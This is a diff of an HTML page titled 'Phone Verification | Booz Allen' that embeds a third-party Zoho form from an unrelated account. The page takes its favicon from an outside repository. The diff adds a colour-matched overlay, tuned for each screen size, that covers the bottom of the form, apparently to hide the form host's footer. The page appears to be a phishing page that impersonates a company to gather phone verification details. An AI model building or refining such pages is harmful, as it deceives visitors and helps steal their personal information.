@@ -4,28 +4,86 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- === YOUR CUSTOM TITLE AND FAVICON GO HERE === -->
+    <!-- === YOUR CUSTOM TITLE AND FAVICON === -->
     <title>Phone Verification | Booz Allen</title>
     <link rel="icon" href="https://raw.githubusercontent.com/xwzwx/veloc-assets/refs/heads/main/booz-allen.png">
     
     <style>
-        /* Basic CSS to make the iframe fill the entire screen */
+        /* === 1. BASE SETUP === */
         html, body {
             margin: 0;
             padding: 0;
             height: 100%;
-            overflow: hidden; /* Hides scrollbars from the container page */
+            overflow: hidden; 
+            font-family: Arial, sans-serif;
+            background-color: #cad7d6; 
         }
+
+        /* === 2. IFRAME CONTAINER === */
+        .iframe-wrapper {
+            position: relative; 
+            width: 100%;
+            height: 100%;
+        }
+
         iframe {
             border: 0;
             width: 100%;
             height: 100%;
         }
+
+        /* === 3. DESKTOP SHIELD (Wider than 1120px) === */
+        .footer-blocker {
+            position: absolute;
+            bottom: 0; 
+            left: 0;
+            width: 100%; 
+            
+            /* Base height for 1 single line of text */
+            height: 125px; 
+            
+            z-index: 50; 
+            background-color: #cad7d6; 
+            pointer-events: none; 
+        }
+
+        /* === 4. SMALL DESKTOP SHIELD (Fixes the 1020px - 1120px gap!) === */
+        @media screen and (max-width: 1120px) {
+            .footer-blocker {
+                /* Bumped up to 145px to catch the early text wrap! */
+                height: 145px; 
+            }
+        }
+
+        /* === 5. TABLET SHIELD (Under 900px) === */
+        @media screen and (max-width: 900px) {
+            .footer-blocker {
+                /* Extra padding for tablet wrap */
+                height: 150px; 
+            }
+        }
+
+        /* === 6. MOBILE SHIELD (Under 600px) === */
+        @media screen and (max-width: 600px) {
+            .footer-blocker {
+                /* Extra padding for 3 lines of mobile wrap */
+                height: 170px; 
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- This iframe will display your Zoho form -->
-    <iframe src="https://forms.zohopublic.com/velocitygloba1/form/PhoneVerification/formperma/5fs83SAfMbxwvae2SWy0nCatWZAdo4UH1hdURHT1WQM">
-    </iframe>
+
+    <div class="iframe-wrapper">
+        
+        <!-- The Bottom Sage-Blue Shield -->
+        <div class="footer-blocker"></div>
+
+        <!-- Your Zoho Form -->
+        <iframe src="https://forms.zohopublic.com/velocitygloba1/form/PhoneVerification/formperma/5fs83SAfMbxwvae2SWy0nCatWZAdo4UH1hdURHT1WQM">
+        </iframe>
+
+    </div>
+    
 </body>
 </html>
